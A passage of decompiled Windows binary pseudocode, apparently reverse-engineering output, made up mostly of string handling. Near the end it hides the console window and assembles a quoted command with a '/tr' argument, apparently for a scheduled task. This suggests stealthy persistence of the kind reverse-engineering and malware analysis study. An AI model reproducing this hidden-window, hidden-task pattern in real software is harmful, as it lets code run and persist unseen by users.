    "  *(_OWORD *)Block = *(_OWORD *)v12;",
    "  v320 = *((_QWORD *)v12 + 2);",
    "  v12[4] = 0;",
    "  v12[5] = (void *)15;",
    "  *(_BYTE *)v12 = 0;",
    "  LOBYTE(v360) = 13;",
    "  sub_1000A4E0((char **)v291, (int)v286, Block, v281);",
    "  LOBYTE(v360) = 15;",
    "  if ( HIDWORD(v320) > 0xF )",
    "  {",
    "    v16 = Block[0];",
    "    v17 = HIDWORD(v320) + 1;",
    "    if ( (unsigned int)(HIDWORD(v320) + 1) >= 0x1000 )",
    "    {",
    "      v16 = (void *)*((_DWORD *)Block[0] - 1);",
    "      v17 = HIDWORD(v320) + 36;",
    "      if ( (unsigned int)((char *)Block[0] - (char *)v16 - 4) > 0x1F )",
    "        goto LABEL_428;",
    "    }",
    "    v270 = v17;",
    "    sub_100154EB(v16);",
    "  }",
    "  LOBYTE(v360) = 16;",
    "  if ( v325 > 0xF )",
    "  {",
    "    v18 = v323[0];",
    "    v19 = v325 + 1;",
    "    if ( v325 + 1 >= 0x1000 )",
    "    {",
    "      v18 = (void *)*((_DWORD *)v323[0] - 1);",
    "      v19 = v325 + 36;",
    "      if ( (unsigned int)((char *)v323[0] - (char *)v18 - 4) > 0x1F )",
    "        goto LABEL_428;",
    "    }",
    "    v270 = v19;",
    "    sub_100154EB(v18);",
    "  }",
    "  v324 = 0;",
    "  v325 = 15;",
    "  LOBYTE(v323[0]) = 0;",
    "  LOBYTE(v360) = 17;",
    "  if ( v328 <= 0xF )",
    "    goto LABEL_42;",
    "  v20 = v326[0];",
    "  v21 = v328 + 1;",
    "  if ( v328 + 1 >= 0x1000 )",
    "  {",
    "    v20 = (void *)*((_DWORD *)v326[0] - 1);",
    "    v21 = v328 + 36;",
    "    if ( (unsigned int)((char *)v326[0] - (char *)v20 - 4) > 0x1F )",
    "LABEL_428:",
    "      _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  v270 = v21;",
    "  sub_100154EB(v20);",
    "LABEL_42:",
    "  v327 = 0;",
    "  v328 = 15;",
    "  LOBYTE(v326[0]) = 0;",
    "  sub_10009E70(&v265, v291);",
    "  sub_1000AA30((int)v295, v265, v266, v267, v268, (int)v269, v270);",
    "  LOBYTE(v360) = 18;",
    "  sub_10009E70(&v265, v284 + 510);",
    "  sub_1000B000(Block, v265, v266, v267, v268, (unsigned int)v269, v270);",
    "  LOBYTE(v360) = 19;",
    "  v22 = Block;",
    "  if ( HIDWORD(v320) > 0xF )",
    "    v22 = (void **)Block[0];",
    "  v283 = (LPCCH)v22;",
    "  sub_10008CD0((int)v301);",
    "  v23 = v301;",
    "  LOBYTE(v360) = 20;",
    "  v24 = v283;",
    "  if ( v302 > 0xF )",
    "    v23 = v301[0];",
    "  v281 = v23;",
    "  *(double *)cbMultiByte = 0.0;",
    "  do",
    "  {",
    "    sub_10011D60(1, v276, v24, v275, v23, &v359, cbMultiByte, v277);",
    "    v23 = v281;",
    "  }",
    "  while ( *(double *)cbMultiByte != *(double *)v305 );",
    "  v25 = v284;",
    "  sub_10009E70(&v259, v284 + 516);",
    "  sub_1000B000(&v265, v259, v260, v261, v262, v263, v264);",
    "  sub_1000AA30((int)v323, v265, v266, v267, v268, (int)v269, v270);",
    "  LOBYTE(v360) = 21;",
    "  sub_10009E70(&v259, v25 + 564);",
    "  sub_1000B000(&v265, v259, v260, v261, v262, v263, v264);",
    "  sub_1000AA30((int)v353, v265, v266, v267, v268, (int)v269, v270);",
    "  LOBYTE(v360) = 22;",
    "  v26 = v353;",
    "  v27 = v353;",
    "  if ( v355 > 7 )",
    "    v26 = (void **)v353[0];",
    "  v270 = 0;",
    "  if ( v355 > 7 )",
    "    v27 = (void **)v353[0];",
    "  v287 = (int)v26 + 2 * v354;",
    "  v28 = v353;",
    "  if ( v355 > 7 )",
    "    v28 = (void **)v353[0];",
    "  v29 = sub_100153B0(v27, (char *)v28 + 2 * v354, v270);",
    "  v30 = v353;",
    "  if ( v355 > 7 )",
    "    v30 = (void **)v353[0];",
    "  v31 = (v29 - (int)v30) >> 1;",
    "  v283 = (LPCCH)v354;",
    "  v32 = (v287 - v29) >> 1;",
    "  if ( v354 - v31 < v32 )",
    "    v32 = v354 - v31;",
    "  v33 = v353;",
    "  v287 = v32;",
    "  if ( v355 > 7 )",
    "    v33 = (void **)v353[0];",
    "  v34 = v354 - v287;",
    "  memmove((char *)v33 + 2 * v31, (char *)v33 + 2 * v31 + 2 * v287, 2 * (v354 - v287 - v31) + 2);",
    "  v354 = v34;",
    "  v286 = &v259;",
    "  sub_10009E70(&v253, v284);",
    "  sub_1000B000(&v259, v253, v254, v255, v256, v257, v258);",
    "  LOBYTE(v360) = 23;",
    "  sub_10009E70(&v253, v282);",
    "  LOBYTE(v360) = 22;",
    "  sub_1000B970(&v265, v253, v254, v255, v256, v257, v258, v259, v260, v261, v262, v263, v264);",
    "  sub_1000AA30((int)Src, v265, v266, v267, v268, (int)v269, v270);",
    "  LOBYTE(v360) = 24;",
    "  v35 = Src;",
    "  if ( v337 > 7 )",
    "    v35 = (void **)Src[0];",
    "  v270 = 0;",
    "  v287 = (int)v35 + 2 * v336;",
    "  v36 = Src;",
    "  if ( v337 > 7 )",
    "    v36 = (void **)Src[0];",
    "  v37 = (char *)v36 + 2 * v336;",
    "  v38 = Src;",
    "  if ( v337 > 7 )",
    "    v38 = (void **)Src[0];",
    "  v39 = sub_100153B0(v38, v37, v270);",
    "  v40 = Src;",
    "  if ( v337 > 7 )",
    "    v40 = (void **)Src[0];",
    "  v41 = (v39 - (int)v40) >> 1;",
    "  v282 = (void *)v336;",
    "  v42 = (v287 - v39) >> 1;",
    "  if ( v336 - v41 < v42 )",
    "    v42 = v336 - v41;",
    "  v43 = Src;",
    "  v287 = v42;",
    "  if ( v337 > 7 )",
    "    v43 = (void **)Src[0];",
    "  v44 = v336 - v287;",
    "  memmove((char *)v43 + 2 * v41, (char *)v43 + 2 * v41 + 2 * v287, 2 * (v336 - v287 - v41) + 2);",
    "  v336 = v44;",
    "  sub_10009E70(&v259, (_DWORD *)v285);",
    "  sub_1000B000(&v265, v259, v260, v261, v262, v263, v264);",
    "  sub_1000AA30((int)v338, v265, v266, v267, v268, (int)v269, v270);",
    "  LOBYTE(v360) = 25;",
    "  v45 = v338;",
    "  if ( v340 > 7 )",
    "    v45 = (void **)v338[0];",
    "  v270 = 0;",
    "  v287 = (int)v45 + 2 * v339;",
    "  v46 = v338;",
    "  if ( v340 > 7 )",
    "    v46 = (void **)v338[0];",
    "  v47 = (char *)v46 + 2 * v339;",
    "  v48 = v338;",
    "  if ( v340 > 7 )",
    "    v48 = (void **)v338[0];",
    "  v49 = sub_100153B0(v48, v47, v270);",
    "  v50 = v338;",
    "  if ( v340 > 7 )",
    "    v50 = (void **)v338[0];",
    "  v51 = (v49 - (int)v50) >> 1;",
    "  v285 = v339;",
    "  v52 = (v287 - v49) >> 1;",
    "  if ( v339 - v51 < v52 )",
    "    v52 = v339 - v51;",
    "  v53 = v338;",
    "  v287 = v52;",
    "  if ( v340 > 7 )",
    "    v53 = (void **)v338[0];",
    "  v54 = v339 - v287;",
    "  memmove((char *)v53 + 2 * v51, (char *)v53 + 2 * v51 + 2 * v287, 2 * (v339 - v287 - v51) + 2);",
    "  v55 = v354;",
    "  v56 = v353;",
    "  v339 = v54;",
    "  if ( v355 == v354 )",
    "  {",
    "    LOBYTE(v285) = 0;",
    "    sub_100116D0(v353, 1, v285, (int)L\"\\\\\", 1);",
    "  }",
    "  else",
    "  {",
    "    ++v354;",
    "    if ( v355 > 7 )",
    "      v56 = (void **)v353[0];",
    "    *((_WORD *)v56 + v55) = psz[0];",
    "    *((_WORD *)v56 + v55 + 1) = 0;",
    "  }",
    "  v57 = Src;",
    "  v58 = v354;",
    "  if ( v337 > 7 )",
    "    v57 = (void **)Src[0];",
    "  v59 = v336;",
    "  v285 = v354;",
    "  if ( v336 > v355 - v354 )",
    "  {",
    "    LOBYTE(v285) = 0;",
    "    sub_100116D0(v353, v336, v285, (int)v57, v336);",
    "  }",
    "  else",
    "  {",
    "    v60 = v353;",
    "    v354 += v336;",
    "    if ( v355 > 7 )",
    "      v60 = (void **)v353[0];",
    "    memmove((char *)v60 + 2 * v58, v57, 2 * v336);",
    "    *((_WORD *)v60 + v59 + v285) = 0;",
    "  }",
    "  v61 = v353;",
    "  v62 = v354;",
    "  if ( v355 == v354 )",
    "  {",
    "    LOBYTE(v285) = 0;",
    "    sub_100116D0(v353, 1, v285, (int)L\"\\\\\", 1);",
    "  }",
    "  else",
    "  {",
    "    ++v354;",
    "    if ( v355 > 7 )",
    "      v61 = (void **)v353[0];",
    "    *((_WORD *)v61 + v62) = psz[0];",
    "    *((_WORD *)v61 + v62 + 1) = 0;",
    "  }",
    "  v63 = v338;",
    "  v64 = v354;",
    "  if ( v340 > 7 )",
    "    v63 = (void **)v338[0];",
    "  v65 = v339;",
    "  v285 = v354;",
    "  if ( v339 > v355 - v354 )",
    "  {",
    "    LOBYTE(v285) = 0;",
    "    sub_100116D0(v353, v339, v285, (int)v63, v339);",
    "  }",
    "  else",
    "  {",
    "    v66 = v353;",
    "    v354 += v339;",
    "    if ( v355 > 7 )",
    "      v66 = (void **)v353[0];",
    "    memmove((char *)v66 + 2 * v64, v63, 2 * v339);",
    "    *((_WORD *)v66 + v65 + v285) = 0;",
    "  }",
    "  sub_10009D70((size_t *)&v265, v353);",
    "  sub_1000AD50((int)v316, (WCHAR *)v265, v266, v267, v268, (int)v269, v270);",
    "  LOBYTE(v360) = 26;",
    "  sub_10009D70((size_t *)&v265, v323);",
    "  sub_1000AD50((int)v350, (WCHAR *)v265, v266, v267, v268, (int)v269, v270);",
    "  LOBYTE(v360) = 27;",
    "  v67 = v350;",
    "  v68 = v350;",
    "  v270 = 0;",
    "  if ( v352 > 0xF )",
    "    v67 = (void **)v350[0];",
    "  v287 = (int)v67 + Size;",
    "  v69 = v350;",
    "  if ( v352 > 0xF )",
    "    v69 = (void **)v350[0];",
    "  v269 = (char *)v69 + Size;",
    "  if ( v352 > 0xF )",
    "    v68 = (void **)v350[0];",
    "  v70 = sub_100153A0(v68, v269, v270);",
    "  v71 = v350;",
    "  if ( v352 > 0xF )",
    "    v71 = (void **)v350[0];",
    "  v72 = v70 - (_DWORD)v71;",
    "  v73 = v287 - v70;",
    "  v285 = Size;",
    "  if ( Size - v72 < v287 - v70 )",
    "    v73 = Size - v72;",
    "  v287 = v73;",
    "  v74 = v350;",
    "  if ( v352 > 0xF )",
    "    v74 = (void **)v350[0];",
    "  v75 = Size - v287;",
    "  memmove((char *)v74 + v72, (char *)v74 + v72 + v287, Size - v287 - v72 + 1);",
    "  Size = v75;",
    "  if ( !dword_100408AC )",
    "  {",
    "    v286 = &unk_1003FBE0;",
    "    if ( _Mtx_lock((_Mtx_t)&unk_1003FBE0) )",
    "      std::_Throw_Cpp_error(5);",
    "    if ( dword_1003FC0C == 0x7FFFFFFF )",
    "    {",
    "      dword_1003FC0C = 2147483646;",
    "      std::_Throw_Cpp_error(6);",
    "    }",
    "    LOBYTE(v360) = 28;",
    "    if ( !dword_100408AC )",
    "    {",
    "      v286 = operator new(1u);",
    "      dword_100408AC = (int)v286;",
    "    }",
    "    LOBYTE(v360) = 27;",
    "    _Mtx_unlock((_Mtx_t)&unk_1003FBE0);",
    "  }",
    "  sub_1000CE40((_BYTE *)v288, PathName);",
    "  v76 = v284;",
    "  LOBYTE(v360) = 29;",
    "  sub_10009E70(&v259, v284 + 480);",
    "  sub_1000B000(&v265, v259, v260, v261, v262, v263, v264);",
    "  sub_1000AA30((int)v326, v265, v266, v267, v268, (int)v269, v270);",
    "  LOBYTE(v360) = 30;",
    "  sub_10009D70((size_t *)&v265, v326);",
    "  sub_10014800((OLECHAR *)v265, v266, v267, v268, (int)v269, v270);",
    "  sub_10009E70(&v259, v76 + 522);",
    "  sub_1000B000(&v265, v259, v260, v261, v262, v263, v264);",
    "  sub_1000AA30((int)v297, v265, v266, v267, v268, (int)v269, v270);",
    "  LOBYTE(v360) = 31;",
    "  sub_10009D70((size_t *)&v265, v297);",
    "  sub_1000AD50((int)v347, (WCHAR *)v265, v266, v267, v268, (int)v269, v270);",
    "  LOBYTE(v360) = 32;",
    "  v77 = v347;",
    "  v78 = v347;",
    "  v270 = 0;",
    "  if ( v349 > 0xF )",
    "    v77 = (void **)v347[0];",
    "  v287 = (int)v77 + v348;",
    "  v79 = v347;",
    "  if ( v349 > 0xF )",
    "    v79 = (void **)v347[0];",
    "  v269 = (char *)v79 + v348;",
    "  if ( v349 > 0xF )",
    "    v78 = (void **)v347[0];",
    "  v80 = sub_100153A0(v78, v269, v270);",
    "  v81 = v347;",
    "  if ( v349 > 0xF )",
    "    v81 = (void **)v347[0];",
    "  v82 = v80 - (_DWORD)v81;",
    "  v83 = v287 - v80;",
    "  v288 = v348;",
    "  if ( v348 - v82 < v287 - v80 )",
    "    v83 = v348 - v82;",
    "  v287 = v83;",
    "  v84 = v347;",
    "  if ( v349 > 0xF )",
    "    v84 = (void **)v347[0];",
    "  v85 = v288 - v287;",
    "  memmove((char *)v84 + v82, (char *)v84 + v82 + v287, v288 - v287 - v82 + 1);",
    "  v348 = v85;",
    "  sub_10009E70(&v265, v284 + 390);",
    "  sub_1000B000(v332, v265, v266, v267, v268, (unsigned int)v269, v270);",
    "  LOBYTE(v360) = 33;",
    "  v86 = v332;",
    "  v87 = v332;",
    "  v270 = 0;",
    "  if ( v334 > 0xF )",
    "    v86 = (void **)v332[0];",
    "  v287 = (int)v86 + v333;",
    "  v88 = v332;",
    "  if ( v334 > 0xF )",
    "    v88 = (void **)v332[0];",
    "  v269 = (char *)v88 + v333;",
    "  if ( v334 > 0xF )",
    "    v87 = (void **)v332[0];",
    "  v89 = sub_100153A0(v87, v269, v270);",
    "  v90 = v332;",
    "  if ( v334 > 0xF )",
    "    v90 = (void **)v332[0];",
    "  v91 = v89 - (_DWORD)v90;",
    "  v92 = v287 - v89;",
    "  v288 = v333;",
    "  if ( v333 - v91 < (unsigned int)(v287 - v89) )",
    "    v92 = v333 - v91;",
    "  v287 = v92;",
    "  v93 = v332;",
    "  if ( v334 > 0xF )",
    "    v93 = (void **)v332[0];",
    "  v94 = v333 - v287;",
    "  memmove((char *)v93 + v91, (char *)v93 + v91 + v287, v333 - v287 - v91 + 1);",
    "  v333 = v94;",
    "  if ( v94 == 0x7FFFFFFF )",
    "    sub_10001540();",
    "  v96 = v332;",
    "  v270 = 1;",
    "  if ( v334 > 0xF )",
    "    v96 = (void **)v332[0];",
    "  sub_1000A6C0(v278, (int)v286, v95, v96, v94, \" \", v270);",
    "  LOBYTE(v360) = 34;",
    "  v97 = v350;",
    "  if ( v352 > 0xF )",
    "    v97 = (void **)v350[0];",
    "  v98 = Size;",
    "  v99 = v279;",
    "  v270 = Size;",
    "  v269 = (const char *)v97;",
    "  if ( Size > v280 - v279 )",
    "  {",
    "    LOBYTE(v288) = 0;",
    "    v102 = sub_1000A260(v278, Size, v288, v269, v270);",
    "  }",
    "  else",
    "  {",
    "    v279 += Size;",
    "    v100 = v278;",
    "    if ( v280 > 0xF )",
    "      v100 = (void **)v278[0];",
    "    v101 = (char *)v100 + v99;",
    "    memmove((char *)v100 + v99, v269, v270);",
    "    v101[v98] = 0;",
    "    v102 = v278;",
    "  }",
    "  v272 = 0;",
    "  *(_OWORD *)v271 = 0;",
    "  *(_OWORD *)v271 = *(_OWORD *)v102;",
    "  v272 = *((_QWORD *)v102 + 2);",
    "  v102[4] = 0;",
    "  v102[5] = (void *)15;",
    "  *(_BYTE *)v102 = 0;",
    "  LOBYTE(v360) = 35;",
    "  v103 = v271;",
    "  v104 = v272;",
    "  if ( HIDWORD(v272) == (_DWORD)v272 )",
    "  {",
    "    LOBYTE(v288) = 0;",
    "    v105 = sub_1000A260(v271, 1u, v288, \" \", 1u);",
    "  }",
    "  else",
    "  {",
    "    LODWORD(v272) = v272 + 1;",
    "    if ( HIDWORD(v272) > 0xF )",
    "      v103 = (void **)v271[0];",
    "    strcpy((char *)v103 + v104, \" \");",
    "    v105 = v271;",
    "  }",
    "  v274 = 0;",
    "  *(_OWORD *)v273 = 0;",
    "  *(_OWORD *)v273 = *(_OWORD *)v105;",
    "  v274 = *((_QWORD *)v105 + 2);",
    "  v105[4] = 0;",
    "  v105[5] = (void *)15;",
    "  *(_BYTE *)v105 = 0;",
    "  LOBYTE(v360) = 36;",
    "  v106 = v347;",
    "  if ( v349 > 0xF )",
    "    v106 = (void **)v347[0];",
    "  v107 = v348;",
    "  v108 = v274;",
    "  v270 = v348;",
    "  v269 = (const char *)v106;",
    "  if ( v348 > HIDWORD(v274) - (int)v274 )",
    "  {",
    "    LOBYTE(v288) = 0;",
    "    v111 = sub_1000A260(v273, v348, v288, v269, v270);",
    "  }",
    "  else",
    "  {",
    "    LODWORD(v274) = v274 + v348;",
    "    v109 = v273;",
    "    if ( HIDWORD(v274) > 0xF )",
    "      v109 = (void **)v273[0];",
    "    v110 = (char *)v109 + v108;",
    "    memmove((char *)v109 + v108, v269, v270);",
    "    v110[v107] = 0;",
    "    v111 = v273;",
    "  }",
    "  *(_OWORD *)v293 = *(_OWORD *)v111;",
    "  v294 = *((_QWORD *)v111 + 2);",
    "  v111[4] = 0;",
    "  v111[5] = (void *)15;",
    "  *(_BYTE *)v111 = 0;",
    "  LOBYTE(v360) = 38;",
    "  if ( HIDWORD(v274) > 0xF )",
    "  {",
    "    v112 = v273[0];",
    "    v113 = HIDWORD(v274) + 1;",
    "    if ( (unsigned int)(HIDWORD(v274) + 1) >= 0x1000 )",
    "    {",
    "      v112 = (void *)*((_DWORD *)v273[0] - 1);",
    "      v113 = HIDWORD(v274) + 36;",
    "      if ( (unsigned int)((char *)v273[0] - (char *)v112 - 4) > 0x1F )",
    "        goto LABEL_432;",
    "    }",
    "    v270 = v113;",
    "    sub_100154EB(v112);",
    "  }",
    "  v274 = 0xF00000000LL;",
    "  LOBYTE(v273[0]) = 0;",
    "  LOBYTE(v360) = 39;",
    "  if ( HIDWORD(v272) > 0xF )",
    "  {",
    "    v114 = v271[0];",
    "    v115 = HIDWORD(v272) + 1;",
    "    if ( (unsigned int)(HIDWORD(v272) + 1) >= 0x1000 )",
    "    {",
    "      v114 = (void *)*((_DWORD *)v271[0] - 1);",
    "      v115 = HIDWORD(v272) + 36;",
    "      if ( (unsigned int)((char *)v271[0] - (char *)v114 - 4) > 0x1F )",
    "        goto LABEL_432;",
    "    }",
    "    v270 = v115;",
    "    sub_100154EB(v114);",
    "  }",
    "  v272 = 0xF00000000LL;",
    "  LOBYTE(v271[0]) = 0;",
    "  LOBYTE(v360) = 40;",
    "  if ( v280 <= 0xF )",
    "    goto LABEL_184;",
    "  v116 = v278[0];",
    "  v117 = v280 + 1;",
    "  if ( v280 + 1 >= 0x1000 )",
    "  {",
    "    v116 = (void *)*((_DWORD *)v278[0] - 1);",
    "    v117 = v280 + 36;",
    "    if ( (unsigned int)((char *)v278[0] - (char *)v116 - 4) > 0x1F )",
    "LABEL_432:",
    "      _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  v270 = v117;",
    "  sub_100154EB(v116);",
    "LABEL_184:",
    "  v279 = 0;",
    "  v280 = 15;",
    "  LOBYTE(v278[0]) = 0;",
    "  sub_10009E70(&v265, v284 + 540);",
    "  sub_1000B000(v341, v265, v266, v267, v268, (unsigned int)v269, v270);",
    "  LOBYTE(v360) = 41;",
    "  v118 = v341;",
    "  v119 = v341;",
    "  v270 = 0;",
    "  if ( v343 > 0xF )",
    "    v118 = (void **)v341[0];",
    "  v287 = (int)v118 + v342;",
    "  v120 = v341;",
    "  if ( v343 > 0xF )",
    "    v120 = (void **)v341[0];",
    "  v269 = (char *)v120 + v342;",
    "  if ( v343 > 0xF )",
    "    v119 = (void **)v341[0];",
    "  v121 = sub_100153A0(v119, v269, v270);",
    "  v122 = v341;",
    "  if ( v343 > 0xF )",
    "    v122 = (void **)v341[0];",
    "  v123 = v121 - (_DWORD)v122;",
    "  v124 = v287 - v121;",
    "  v288 = v342;",
    "  if ( v342 - v123 < v287 - v121 )",
    "    v124 = v342 - v123;",
    "  v287 = v124;",
    "  v125 = v341;",
    "  if ( v343 > 0xF )",
    "    v125 = (void **)v341[0];",
    "  v126 = v342 - v287;",
    "  memmove((char *)v125 + v123, (char *)v125 + v123 + v287, v342 - v287 - v123 + 1);",
    "  v342 = v126;",
    "  sub_10009E70(&v265, v284 + 546);",
    "  sub_1000B000(v329, v265, v266, v267, v268, (unsigned int)v269, v270);",
    "  LOBYTE(v360) = 42;",
    "  v127 = v329;",
    "  if ( v331 > 0xF )",
    "    v127 = (void **)v329[0];",
    "  v287 = (int)v127 + v330;",
    "  v128 = v329;",
    "  if ( v331 > 0xF )",
    "    v128 = (void **)v329[0];",
    "  v129 = v329;",
    "  v130 = (char *)v128 + v330;",
    "  v270 = 0;",
    "  if ( v331 > 0xF )",
    "    v129 = (void **)v329[0];",
    "  v131 = sub_100153A0(v129, v130, v270);",
    "  v132 = v329;",
    "  if ( v331 > 0xF )",
    "    v132 = (void **)v329[0];",
    "  v133 = v131 - (_DWORD)v132;",
    "  v134 = v287 - v131;",
    "  v288 = v330;",
    "  if ( v330 - v133 < (unsigned int)(v287 - v131) )",
    "    v134 = v330 - v133;",
    "  v287 = v134;",
    "  v135 = v329;",
    "  if ( v331 > 0xF )",
    "    v135 = (void **)v329[0];",
    "  v136 = v330 - v287;",
    "  memmove((char *)v135 + v133, (char *)v135 + v133 + v287, v330 - v287 - v133 + 1);",
    "  v330 = v136;",
    "  sub_10009E70(&v265, v284 + 552);",
    "  sub_1000B000(v344, v265, v266, v267, v268, (unsigned int)v269, v270);",
    "  LOBYTE(v360) = 43;",
    "  v137 = v344;",
    "  v138 = v344;",
    "  v270 = 0;",
    "  if ( v346 > 0xF )",
    "    v137 = (void **)v344[0];",
    "  v287 = (int)v137 + v345;",
    "  v139 = v344;",
    "  if ( v346 > 0xF )",
    "    v139 = (void **)v344[0];",
    "  v269 = (char *)v139 + v345;",
    "  if ( v346 > 0xF )",
    "    v138 = (void **)v344[0];",
    "  v140 = sub_100153A0(v138, v269, v270);",
    "  v141 = v344;",
    "  if ( v346 > 0xF )",
    "    v141 = (void **)v344[0];",
    "  v142 = v140 - (_DWORD)v141;",
    "  v143 = v287 - v140;",
    "  v288 = v345;",
    "  if ( v345 - v142 < v287 - v140 )",
    "    v143 = v345 - v142;",
    "  v287 = v143;",
    "  v144 = v344;",
    "  if ( v346 > 0xF )",
    "    v144 = (void **)v344[0];",
    "  v145 = v288 - v287;",
    "  memmove((char *)v144 + v142, (char *)v144 + v142 + v287, v288 - v287 - v142 + 1);",
    "  v345 = v145;",
    "  v270 = 0;",
    "  ConsoleWindow = GetConsoleWindow();",
    "  ShowWindow(ConsoleWindow, v270);",
    "  sub_10009E70(v356, v329);",
    "  LOBYTE(v360) = 44;",
    "  v147 = v356;",
    "  v148 = v357;",
    "  if ( v358 == v357 )",
    "  {",
    "    LOBYTE(v288) = 0;",
    "    sub_1000A260(v356, 1u, v288, L\"\\\"\", 1u);",
    "  }",
    "  else",
    "  {",
    "    ++v357;",
    "    if ( v358 > 0xF )",
    "      v147 = (void **)v356[0];",
    "    *((_BYTE *)v147 + v148) = asc_1003B444[0];",
    "    *((_BYTE *)v147 + v148 + 1) = 0;",
    "  }",
    "  v149 = v347;",
    "  if ( v349 > 0xF )",
    "    v149 = (void **)v347[0];",
    "  v150 = v348;",
    "  v151 = v357;",
    "  v270 = v348;",
    "  v269 = (const char *)v149;",
    "  if ( v348 > v358 - v357 )",
    "  {",
    "    LOBYTE(v288) = 0;",
    "    sub_1000A260(v356, v348, v288, v269, v270);",
    "  }",
    "  else",
    "  {",
    "    v357 += v348;",
    "    v152 = v356;",
    "    if ( v358 > 0xF )",
    "      v152 = (void **)v356[0];",
    "    v153 = (char *)v152 + v151;",
    "    memmove((char *)v152 + v151, v269, v270);",
    "    v153[v150] = 0;",
    "  }",
    "  v154 = v356;",
    "  v155 = v357;",
    "  if ( v358 == v357 )",
    "  {",
    "    LOBYTE(v288) = 0;",
    "    sub_1000A260(v356, 1u, v288, L\"\\\"\", 1u);",
    "  }",
    "  else",
    "  {",
    "    ++v357;",
    "    if ( v358 > 0xF )",
    "      v154 = (void **)v356[0];",
    "    *((_BYTE *)v154 + v155) = asc_1003B444[0];",
    "    *((_BYTE *)v154 + v155 + 1) = 0;",
    "  }",
    "  v270 = 5;",
    "  v269 = \" /tr \";",
    "  if ( v358 - v357 < 5 )",
    "  {",
    "    LOBYTE(v288) = 0;",
    "    sub_1000A260(v356, 5u, v288, v269, v270);",
    "  }",
    "  else",
    "  {",
    "    v156 = v356;",
    "    if ( v358 > 0xF )",
    "      v156 = (void **)v356[0];",
    "    v157 = (char *)v156 + v357;",
    "    v357 += 5;",
    "    memmove(v157, v269, v270);",
    "    v157[5] = 0;",
    "  }",
    "  v158 = v356;",
    "  v159 = v357;",
    "  if ( v358 == v357 )",
    "  {",
    "    LOBYTE(v288) = 0;",
    "    sub_1000A260(v356, 1u, v288, L\"\\\"\", 1u);",
    "  }",
    "  else",
    "  {",
    "    ++v357;",
    "    if ( v358 > 0xF )",
    "      v158 = (void **)v356[0];",
    "    *((_BYTE *)v158 + v159) = asc_1003B444[0];",
    "    *((_BYTE *)v158 + v159 + 1) = 0;",
    "  }",
    "  v160 = v341;",
    "  if ( v343 > 0xF )",
    "    v160 = (void **)v341[0];",
    "  v161 = v342;",
    "  v162 = v357;",
    "  v270 = v342;",
    "  v269 = (const char *)v160;",
    "  if ( v342 > v358 - v357 )",
    "  {",
    "    LOBYTE(v288) = 0;",
    "    sub_1000A260(v356, v342, v288, v269, v270);",
    "  }",
    "  else",
    "  {",
    "    v357 += v342;",
    "    v163 = v356;",
    "    if ( v358 > 0xF )",
    "      v163 = (void **)v356[0];",
    "    v164 = (char *)v163 + v162;",
    "    memmove((char *)v163 + v162, v269, v270);",
    "    v164[v161] = 0;",
    "  }",
    "  v165 = v356;",
    "  v166 = v357;",
    "  if ( v358 == v357 )",
    "  {",
    "    LOBYTE(v288) = 0;",
    "    sub_1000A260(v356, 1u, v288, \" \", 1u);",
    "  }",
    "  else",
    "  {",
    "    ++v357;",
    "    if ( v358 > 0xF )",
    "      v165 = (void **)v356[0];",
    "    strcpy((char *)v165 + v166, \" \");",
    "  }",
    "  v167 = v356;",
    "  v168 = v357;",
    "  if ( v358 == v357 )",
    "  {",
    "    LOBYTE(v288) = 0;",
    "    sub_1000A260(v356, 1u, v288, L\"\\\"\", 1u);",
    "  }",
    "  else",
    "  {",
    "    ++v357;",
    "    if ( v358 > 0xF )",
    "      v167 = (void **)v356[0];",
    "    *((_BYTE *)v167 + v168) = asc_1003B444[0];",
    "    *((_BYTE *)v167 + v168 + 1) = 0;",
    "  }",
    "  v169 = v316;",
    "  if ( v318 > 0xF )",
    "    v169 = (void **)v316[0];",
    "  v170 = v317;",
    "  v171 = v357;",
    "  v270 = v317;",
    "  v269 = (const char *)v169;",
    "  if ( v317 > v358 - v357 )",
    "  {",
    "    LOBYTE(v288) = 0;",
    "    sub_1000A260(v356, v317, v288, v269, v270);",
    "  }",
    "  else",
    "  {",
    "    v357 += v317;",
    "    v172 = v356;",
    "    if ( v358 > 0xF )",
    "      v172 = (void **)v356[0];",
    "    v173 = (char *)v172 + v171;",
    "    memmove((char *)v172 + v171, v269, v270);",
    "    v173[v170] = 0;",
    "  }",
    "  v174 = v356;",
    "  v175 = v357;",
    "  if ( v358 == v357 )",
    "  {",
    "    LOBYTE(v288) = 0;",
    "    sub_1000A260(v356, 1u, v288, L\"\\\"\", 1u);",
    "  }",
    "  else",
    "  {",
    "    ++v357;",
    "    if ( v358 > 0xF )",
    "      v174 = (void **)v356[0];",
    "    *((_BYTE *)v174 + v175) = asc_1003B444[0];",
    "    *((_BYTE *)v174 + v175 + 1) = 0;",
    "  }",
    "  v176 = v350;",
    "  if ( v352 > 0xF )",
    "    v176 = (void **)v350[0];",
    "  v177 = Size;",
    "  v178 = v357;",
    "  v270 = Size;",
    "  v269 = (const char *)v176;",
    "  if ( Size > v358 - v357 )",
    "  {",
    "    LOBYTE(v288) = 0;",
    "    sub_1000A260(v356, Size, v288, v269, v270);",
    "  }",
    "  else",
    "  {",
    "    v357 += Size;",
    "    v179 = v356;",
    "    if ( v358 > 0xF )",
    "      v179 = (void **)v356[0];",
    "    v180 = (char *)v179 + v178;",
    "    memmove((char *)v179 + v178, v269, v270);",
    "    v180[v177] = 0;",
    "  }",
    "  v181 = v356;",
    "  v182 = v357;",
    "  if ( v358 == v357 )",
    "  {",
    "    LOBYTE(v288) = 0;",
    "    sub_1000A260(v356, 1u, v288, L\"\\\"\", 1u);",
    "  }",
    "  else",
    "  {",
    "    ++v357;",
    "    if ( v358 > 0xF )",
    "      v181 = (void **)v356[0];",
    "    *((_BYTE *)v181 + v182) = asc_1003B444[0];",
    "    *((_BYTE *)v181 + v182 + 1) = 0;",
    "  }",
    "  v183 = v356;",
    "  v184 = v357;",
    "  if ( v358 == v357 )",
    "  {",
    "    LOBYTE(v288) = 0;",
    "    sub_1000A260(v356, 1u, v288, \" \", 1u);",
    "  }",
    "  else",
    "  {",
    "    ++v357;",
    "    if ( v358 > 0xF )",
    "      v183 = (void **)v356[0];",
    "    strcpy((char *)v183 + v184, \" \");",
    "  }",
    "  v185 = v344;",
    "  if ( v346 > 0xF )",
    "    v185 = (void **)v344[0];",
    "  v186 = v345;",
    "  v187 = v357;",
    "  v270 = v345;",
    "  v269 = (const char *)v185;",
    "  if ( v345 > v358 - v357 )",
    "  {",
    "    LOBYTE(v288) = 0;",
